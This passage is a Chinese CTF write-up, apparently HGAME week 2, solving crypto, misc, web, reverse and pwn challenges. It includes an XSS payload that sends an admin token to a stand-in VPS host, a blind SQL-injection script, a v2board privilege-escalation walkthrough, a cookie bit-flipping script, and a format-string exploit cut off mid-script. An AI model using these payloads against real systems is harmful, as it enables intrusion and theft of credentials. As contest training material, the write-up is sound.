按UUID格式连接得flag： hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;。 ​ crazy_qrcode 兔兔在买年货,但是看着商家的付款二维码犯了难 png图片的二维码无法扫描，使用QRazyBox导入，利用自带工具 Brute-force Format Info Pattern 可以得到： 1234Decoded Message :QDjkXkpM0BHNXujsError Correction Level : HMask Pattern : 4 使用 QDjkXkpM0BHNXujs 解压zip压缩包，得到25张分割的二维码图片，以及一个25长度的数组。 1为90°旋转，2为180°旋转，3为270°旋转，0为不旋转，?为需选择其中一个值调整。 按照5×5拼接好后扫描得到flag：hgame&#123;Cr42y_qrc0de&#125;。 ​ CryptoRabin 看起来非常像RSA呢。 1234567891011121314151617181920212223&gt;from Crypto.Util.number import *def gen_key(kbits): while True: p = getPrime(kbits) q = getPrime(kbits) if p % 4 == 3 and q % 4== 3: break return p, qp ,q = gen_key(256) flag = open(&quot;flag&quot;, &#x27;rb&#x27;).read() pt = bytes_to_long(flag) c = pow(pt, 2, p*q) print(f&quot;p=&#123;p&#125;\\nq=&#123;q&#125;&quot;) print(f&quot;c=&#123;hex(c)[2:]&#125;&quot;) &quot;&quot;&quot;p=65428327184555679690730137432886407240184329534772421373193521144693375074983q=98570810268705084987524975482323456006480531917292601799256241458681800554123 c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556 &quot;&quot;&quot; $e=2$，Rabin算法解RSA。 12345678910111213141516171819202122232425import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) p = 65428327184555679690730137432886407240184329534772421373193521144693375074983q = 98570810268705084987524975482323456006480531917292601799256241458681800554123c = 0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556m = rabin_decrypt(c,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass # b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27; ​ RSA 大冒险1 马上要过年喽，兔兔开心地去超市买年货，但是超市门口却写着”只有完成挑战才能进入超市”，你能帮帮兔兔吗 123456789101112131415161718192021# challenge1.pyfrom Crypto.Util.number import *from challenges import chall1_secretclass RSAServe: def __init__(self) -&gt; None: self.e = 65537 self.p = getPrime(128) self.q = getPrime(100) self.r = getPrime(100) self.m = chall1_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q*self.r) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q*self.r, self.e, self.p 12345678910111213141516171819202122# challenge2.pyfrom Crypto.Util.number import *from challenges import chall2_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = 65537 self.m = chall2_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_ ,self.e, self.p*self.q) self.q = getPrime(512) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e 123456789101112131415161718192021# challenge3.pyfrom Crypto.Util.number import *from challenges import chall3_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = 3 self.m = chall3_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e 12345678910111213141516171819202122# challenge4.pyfrom Crypto.Util.number import *from challenges import chall4_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = getPrime(17) self.m = chall4_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q) self.e = getPrime(17) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e 求解四层RSA拿flag。 第一层，$m&lt;p$，无需完全分解 $n$。 12345678n = 322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437e = 65537p = 304198953434620851532952216290120837853c = 0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077dd = inverse_mod(e,p-1)m = int(pow(c%p,d,p))print(bytes.fromhex(hex(m)[2:]))# b&#x27;m&lt;n_But_also_m&lt;p&#x27; 第二层，$\\gcd(n1,n2)=p$，交互两次数据。 123456789101112n1 = 85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317c1 = 0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118n2 = 59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263c2 = 0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6ae = 65537p = gcd(n1,n2)q1 = n1//pf = (p-1)*(q1-1)d = inverse_mod(e,f)m = pow(c1,d,n1)print(bytes.fromhex(hex(m)[2:]))#b&#x27;make_all_modulus_independent&#x27; 第三层，$e=3$，$m^e \\lt n$，小 $e$ 攻击。 1234567import gmpy2n = 62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309e = 3c = 0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748m = gmpy2.iroot(c,e)[0]print(bytes.fromhex(hex(m)[2:]))#b&#x27;encrypt_exponent_should_be_bigger&#x27; 第四层，共模攻击，交互两次数据。 123456789101112131415161718192021222324252627import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367e1 = 81919c1 = 0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169adde2 = 108041c2 = 0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(bytes.fromhex(hex(m)[2:]))#b&#x27;never_uese_same_modulus&#x27; 四次提交正确得flag：hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;。 ​ 包里有什么 兔兔收到了一包年货，但是他忘了里面有什么了。 1234567891011121314151617181920212223242526from random import randintfrom libnum import gcd, s2nfrom secret import flagplain = flag[6:-1]assert flag == &#x27;hgame&#123;&#x27; + plain + &#x27;&#125;&#x27;v = bin(s2n(plain))[2:]l = len(v)a = [2 &lt;&lt; i for i in range(l)]m = randint(sum(a), 2 &lt;&lt; l + 1)w = randint(0, m)assert gcd(w, m) == 1b = [w * i % m for i in a]c = 0for i in range(l): c += b[i] * int(v[i])print(f&#x27;m = &#123;m&#125;&#x27;)print(f&#x27;b0 = &#123;b[0]&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)# m = 1528637222531038332958694965114330415773896571891017629493424# b0 = 69356606533325456520968776034730214585110536932989313137926# c = 93602062133487361151420753057739397161734651609786598765462162 先利用 $b_0$ 求 $w$，再解背包密码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647m = 1528637222531038332958694965114330415773896571891017629493424b0 = 69356606533325456520968776034730214585110536932989313137926c = 93602062133487361151420753057739397161734651609786598765462162w = b0//2# 预估长度for k in range(3): l = m.nbits() - k a = [2 &lt;&lt; i for i in range(l)] b = [w * i % m for i in a] pk = b ct = c n = len(pk) M = Matrix.identity(n) * 2 last_row = [1 for x in pk] M_last_row = Matrix(ZZ, 1, len(last_row), last_row) last_col = pk last_col.append(ct) M_last_col = Matrix(ZZ, len(last_col), 1, last_col) M = M.stack(M_last_row) M = M.augment(M_last_col) X = M.BKZ() sol = [] for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) break s = bytes.fromhex(hex(int(&#x27;&#x27;.join(map(str,sol)),2))[2:]) print(s) # b&#x27;:/b2\\x83.F\\x832z2\\x1a\\x82v&#123;\\x1a\\x82Z2G&quot;\\x82Z/\\x03&#x27;# b&#x27;b\\xe8N\\xe6\\xbeh\\xdc\\xbef\\xc2\\xe6\\xf2\\xbe\\xc4\\xc2r\\xbe\\xd2\\xe6\\xdcn\\xbe\\xd2\\xe8~&#x27;# b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot; ​ 零元购年货商店 听说兔兔要买年货，正好提瓦特大陆的璃月海灯节也要到了，tr0uble特地为兔兔准备了一份flag大礼。嗯，你也想要？不可以哦。 router/router.go 里主要逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func loginController(c *gin.Context) &#123; _, err := c.Cookie(&quot;token&quot;) if err == nil &#123; c.Redirect(http.StatusFound, &quot;/home&quot;) &#125; userName := c.PostForm(&quot;username&quot;) if userName == &quot;Vidar-Tu&quot; &#123; c.String(http.StatusForbidden, &quot;兔兔才不可能是你呢！！&quot;) &#125; User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: &quot;230555433&quot;&#125; jsonUser, _ := json.Marshal(User) token, _ := util.Encrypt(string(jsonUser)) c.SetCookie(&quot;token&quot;, token, 3600, &quot;/&quot;, &quot;&quot;, false, true) c.Redirect(http.StatusFound, &quot;/home&quot;)&#125;func buyController(c *gin.Context) &#123; method := c.Request.Method token, err := c.Cookie(&quot;token&quot;) if err != nil &#123; c.String(http.StatusForbidden, &quot;没有身份的人可不能来这儿买东西。&quot;) &#125; jsonUser, err := util.Decrypt(token) if err != nil &#123; c.String(http.StatusBadGateway, err.Error()) &#125; User := user.User&#123;&#125; err = json.Unmarshal([]byte(jsonUser), &amp;User) if err != nil &#123; c.String(http.StatusBadGateway, err.Error()) &#125; name := User.Name if method != http.MethodGet &#123; c.String(http.StatusMethodNotAllowed, fmt.Sprintf(&quot;your method: %s. but only get method allowed&quot;, method)) &#125; else &#123; product := c.Query(&quot;prod&quot;) if product == &quot;flag&quot; &#123; if name != &quot;Vidar-Tu&quot; &#123; c.String(http.StatusOK, &quot;flag 可是特地为兔兔准备的！&quot;) &#125; else &#123; file, _ := os.Open(&quot;flag.txt&quot;) flag, _ := io.ReadAll(file) c.String(http.StatusOK, fmt.Sprintf(&quot;%s buy %s successfully\\n%s&quot;, name, product, flag)) &#125; &#125; else &#123; c.String(http.StatusOK, fmt.Sprintf(&quot;%s buy %s successfully&quot;, name, product)) &#125; &#125;&#125; 需要token里userName值为 Vidar-Tu，但不能直接输入 Vidar-Tu。 查看 util/util.go 里： 1234567891011121314151617181920212223242526272829303132333435363738394041package utilimport ( &quot;crypto/aes&quot; &quot;crypto/cipher&quot; &quot;crypto/rand&quot; &quot;encoding/base64&quot; &quot;errors&quot;)var key = make([]byte, 16)var iv = make([]byte, 16)func init() &#123; _, _ = rand.Read(key) _, _ = rand.Read(iv)&#125;func Encrypt(u string) (string, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return &quot;&quot;, err &#125; plainText := []byte(u) blockMode := cipher.NewCTR(block, iv) cipherText := make([]byte, len(plainText)) blockMode.XORKeyStream(cipherText, plainText) return base64.StdEncoding.EncodeToString(cipherText), nil&#125;func Decrypt(cipherText string) (string, error) &#123; decodeData, err := base64.StdEncoding.DecodeString(cipherText) if err != nil &#123; return &quot;&quot;, errors.New(&quot;invalid base64&quot;) &#125; block, err := aes.NewCipher(key) blockMode := cipher.NewCTR(block, iv) plainText := make([]byte, len(decodeData)) blockMode.XORKeyStream(plainText, decodeData) return string(plainText), nil&#125; token的使用AES-CTR模式加密生成，而在CTR模式中， 有一个自增的算子（IV，后四个字节相当于计数器，每次计算递增），这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密，即 $m \\oplus \\text{keystream} = c$。 用户名和token为一一对应关系，输入 Vidar-Tv 和 Vidar-Tw 获取对应token的base64字符串，找到改变的字符，爆破： 123456789101112131415import requestsimport stringfrom urllib.parse import quotes = requests.Session()dic = string.ascii_letters+string.digits+&#x27;+/&#x27;for k in dic: token = f&#x27;NnL3arZc7tt+ezcky+B8fF&#123;k&#125;75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27; url = &#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27; r = s.get(url, cookies=&#123;&#x27;token&#x27;:quote(token)&#125;) if &#x27;Vidar-Tu&#x27; in r.text: print(k,quote(token),r.text) # 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully 修改cookie中的token，购买flag，得到flag：hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;。 ​ WebGit Leakage 电视剧里的黑客?真正的黑客！ 题目即提示，git泄露。 访问 http://HOST:PORT/.git/，使用wget下载git目录： wget -r http://week-2.hgame.lwsec.cn:31765/.git/ 进入 .git/logs，使用 git reflog 查看所有分支的所有操作记录（包括已经被删除的 commit 记录和 reset 的操作）； 选择需要查看的记录，git show 1dd69e2 拿到flag：hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;。 ​ v2board 请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。 v2board存在越权漏洞，参考v2board越权漏洞复现。 首先注册一个普通用户账号，然后通过 http://HOST:PORT/api/v1/passport/auth/login 接口登录该账号，会返回一个 auth_data 值； 然后访问 http://HOST:PORT/api/v1/user/login 接口，并将上述获得的 auth_data 作为authorization头发送，让服务器将普通用户的Authorization头写入缓存中； 最后只要带上这个Authorization头即可访问所有的管理员接口。 访问 http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1，得到flag：hgame&#123;39d580e71705f6abac9a414def74c466&#125;。 ​ Search Commodity R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货） R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码” 貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？ (数据库启动需要时间，若出现Internal Error，需要稍等片刻) HINTS: 密码是弱密码，可以自己找个dict爆破一下 根据hint猜密码 admin123，sql注入，fuzz发现过滤了空格、select、database、or、等号、大小于号等关键字。关键字改大写，等号改 regexp 绕过。 布尔盲注： 123456789101112131415161718192021222324252627282930313233import requestsimport stringdic = string.digits+string.ascii_letters+&#x27;&#123;&#125;-_?!,&#x27;s = requests.Session()url = &#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;now = &#x27;&#x27;for i in range(1,100): flag = 0 for j in dic: #sql = &#x27;SELECT(DATABASE())&#x27; #sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27; #sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27; sql = &#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27; payload = f&quot;0^(substr((&#123;sql&#125;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;))&quot; #print(payload) data = &#123;&#x27;search_id&#x27;:payload&#125; cookie = &#123;&#x27;SESSION&#x27;:&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;&#125; r = s.post(url,data=data,cookies=cookie) #print(r.text) if &#x27;hard disk&#x27; in r.text: now += j print(now) flag = 1 break if flag == 0: break # database: se4rch# table: 5ecret15here,L1st,user1nf0# column: f14gggg1shere# 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d 得到flag：hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;。 ​ Designer Come and design your button 在 index.js 中 /button/share 路由会调用 /button/preview 路由： 123456789101112131415161718192021222324252627282930app.post(&quot;/button/share&quot;, auth, async (req, res) =&gt; &#123; const browser = await puppeteer.launch(&#123; headless: true, executablePath: &quot;/usr/bin/chromium&quot;, args: [&#x27;--no-sandbox&#x27;] &#125;); const page = await browser.newPage() const query = querystring.encode(req.body) await page.goto(&#x27;http://127.0.0.1:9090/button/preview?&#x27; + query) await page.evaluate(() =&gt; &#123; return localStorage.setItem(&quot;token&quot;, &quot;jwt_token_here&quot;) &#125;) await page.click(&quot;#button&quot;) res.json(&#123; msg: &quot;admin will see it later&quot; &#125;)&#125;)app.get(&quot;/button/preview&quot;, (req, res) =&gt; &#123; const blacklist = [ /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/ ] for (const key in req.query) &#123; for (const item of blacklist) &#123; if (item.test(key.trim()) || item.test(req.query[key].trim())) &#123; req.query[key] = &quot;&quot; &#125; &#125; &#125; res.render(&quot;preview&quot;, &#123; data: req.query &#125;)&#125;) 测试发现 /button/preview 路由存在XSS注入，尝试XSS请求伪造： 12345678var xhr=new XMLHttpRequest();xhr.open(&quot;POST&quot;,&quot;http://127.0.0.1:9090/user/register&quot;,false);xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xhr.send(JSON.stringify(&#123;&quot;username&quot;:&quot;admin&quot;&#125;));url=&quot;http://VPS-IP/x.php?token=&quot;+String(xhr.responseText);var xhr2=new XMLHttpRequest();xhr2.open(&quot;GET&quot;,url,false);xhr2.send(&quot;token&quot;); admin点击后，生成正确token，发送到VPS的apache日志中： 1[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot; 解析jwt，得到flag：hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;。 ​ Reversebefore_main在 sub_558AEC339229() 中使用 ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) 机制将base64码表修改： 123456789101112__int64 sub_558AEC339229()&#123; __int64 result; // rax result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL); if ( result != -1 ) &#123; strcpy((char *)&amp;qword_558AEC33C020, &quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;); return 0x636D79474568756ALL; &#125; return result;&#125; 再解码即可，flag：hgame&#123;s0meth1ng_run_befOre_m@in&#125;。 ​ stream 兔兔假期前学习了编程，你能看出来他学的是什么语言吗 python程序逆向，使用pyinstxtractor将exe解包得到 stream.pyc 文件，再用uncompyle6反编译，得到源码： 1234567891011121314151617181920212223242526272829303132333435363738394041# Source Generated with Decompyle++# File: stream.pyc (Python 3.8)import base64def gen(key):Warning: block stack is not empty! s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key):Warning: block stack is not empty! result = &#x27;&#x27; for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) result = base64.b64encode(result.encode()).decode() return resulttext = input(&#x27;Flag: &#x27;)key = &#x27;As_we_do_as_you_know&#x27;enc = encrypt(text, key)if enc == &#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;: print(&#x27;yes!&#x27;) return NoneNone(&#x27;try again...&#x27;) 识别为RC4加密算法，cyberchef解出flag：hgame&#123;python_reverse_is_easy_with_internet&#125;。 ​ math 由于兔兔的学校提前放假，开学才能期末考试，于是兔兔开始了他的寒假期末复习~ 实际为解非齐次线性方程组，矩阵乘法逆运算，这里使用z3求解： 123456789101112131415161718192021222324252627from z3 import *x = [126, 225, 62, 40, 216, 253, 20, 124, 232, 122, 62, 23, 100, 161, 36, 118, 21, 184, 26, 142, 59, 31, 186, 82, 79]out = [0] * len(x)c = [63998, 33111, 67762, 54789, 61979, 69619, 37190, 70162, 53110, 68678, 63339, 30687, 66494, 50936, 60810, 48784, 30188, 60104, 44599, 52265, 43048, 23660, 43850, 33646, 44270]s = Solver()f = [Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(25)]ff = f[:]for i in range(5): for j in range(5): tmp = 0 for k in range(5): out[5*i+j] += ff[5*i+k] * x[5*k+j] s.add(out[5*i+j] == c[5*i+j])s.check()m = s.model()flag = &#x27;&#x27;for i in range(25): flag += chr(m[f[i]].as_long())print(flag)# hgame&#123;y0ur_m@th_1s_gO0d&#125; ​ VidarCamera 兔兔最近在学习Android开发，这是他抄的相机程序 apk内关键代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152private final int[] m229encrypthkIa6DI(int[] iArr) &#123; int i; int[] m446constructorimpl = UIntArray.m446constructorimpl(4); UIntArray.m457setVXSXFK8(m446constructorimpl, 0, 2233); UIntArray.m457setVXSXFK8(m446constructorimpl, 1, 4455); UIntArray.m457setVXSXFK8(m446constructorimpl, 2, 6677); UIntArray.m457setVXSXFK8(m446constructorimpl, 3, 8899); int i2 = 0; while (i2 &lt; 9) &#123; int i3 = 0; int i4 = 0; do &#123; i3++; i = i2 + 1; UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; 3)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; 4) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; 5)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4))); UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; 4) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; 5)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; 11) &amp; 3)) + i4)))); i4 = UInt.m393constructorimpl(i4 + 878077251); &#125; while (i3 &lt;= 32); i2 = i; &#125; return iArr;&#125;public static final void m230onCreate$lambda0(EditText inputsomething, CameraActivity this$0, AlertDialog alertDialog, View view) &#123; Intrinsics.checkNotNullParameter(inputsomething, &quot;$inputsomething&quot;); Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;); String obj = inputsomething.getText().toString(); if (obj.length() != 40) &#123; Toast.makeText(this$0, &quot;序列号不正确&quot;, 0).show(); return; &#125; int[] m446constructorimpl = UIntArray.m446constructorimpl(10); for (int i = 0; i &lt; 40; i += 4) &#123; UIntArray.m457setVXSXFK8(m446constructorimpl, i / 4, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + 1) &lt;&lt; &#x27;\\b&#x27;)) + UInt.m393constructorimpl(obj.charAt(i + 2) &lt;&lt; 16)) + UInt.m393constructorimpl(obj.charAt(i + 3) &lt;&lt; 24))); &#125; int[] m229encrypthkIa6DI = this$0.m229encrypthkIa6DI(m446constructorimpl); UInt[] uIntArr = &#123;UInt.m387boximpl(637666042), UInt.m387boximpl(457511012), UInt.m387boximpl(-2038734351), UInt.m387boximpl(578827205), UInt.m387boximpl(-245529892), UInt.m387boximpl(-1652281167), UInt.m387boximpl(435335655), UInt.m387boximpl(733644188), UInt.m387boximpl(705177885), UInt.m387boximpl(-596608744)&#125;; int i2 = 0; while (true) &#123; int i3 = i2 + 1; if (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123; Toast.makeText(this$0, &quot;序列号不正确&quot;, 0).show(); return; &#125; else if (i3 &gt; 9) &#123; alertDialog.dismiss(); return; &#125; else &#123; i2 = i3; &#125; &#125;&#125; 魔改XTEA加密，修改了delta、异或操作和加密顺次，解密脚本在相应地方修改： 1234567891011121314151617181920212223242526272829from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] delta = 0x34566543 x = delta * 33 for i in range(33): x -= delta x = x &amp; 0xFFFFFFFF v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) ^ x v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return v c = [0x260202FA, 0x1B451064, 0x867B61F1, 0x228033C5, 0xF15D82DC, 0x9D8430B1, 0x19F2B1E7, 0x2BBA859C, 0x2A08291D, 0xDC707918]key = [2233, 4455, 6677, 8899]flag = b&#x27;&#x27;for i in range(len(c)-1): d = decrypt(c[-2:], key) flag = long_to_bytes(d[1])[::-1] + flag c = c[:-2] + [d[0]]print(flag)# b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27; 补全flag头，flag：hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;。 ​ PwnYukkuriSay HINTS: 格式化占位符的值来自于函数的参数，同时64位程序传参不是只用寄存器的哦 %n占位符是存在溢出的 打格式化字符串，分别泄露栈地址和 __libc_start_main() 地址求得libc基地址，再用one_gadget打即可。 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote(&#x27;week-2.hgame.lwsec.cn&#x27;,30687)elf = ELF(&#x27;vuln&#x27;)libc = ELF(&quot;libc-2.31.so&quot;)r.recvline()r.send(&#x27;a&#x27;*0x100)stack_addr = u64(r.recvuntil(&#x27;\\x7f&#x27;)[-6:]+&#x27;\\x00&#x27;*2)-8print(hex(stack_addr))r.recvline()r.sendline(&#x27;Y&#x27;)r.send(p64(stack_addr)*0x20)r.recvline()r.sendline(&#x27;n&#x27;)pl = &#x27;%45$p%4418c%8$hn&#x27;r.send(pl)r.recvuntil(&#x27;0x&#x27;)libc_start_main = eval(&#x27;0x&#x27;+r.recv(12))-243libc_base = libc_start_main - libc.sym.__libc_start_mainprint(hex(libc_base))#r.recvline()ogg = libc_base+0xe3b01r.recvline()pl = 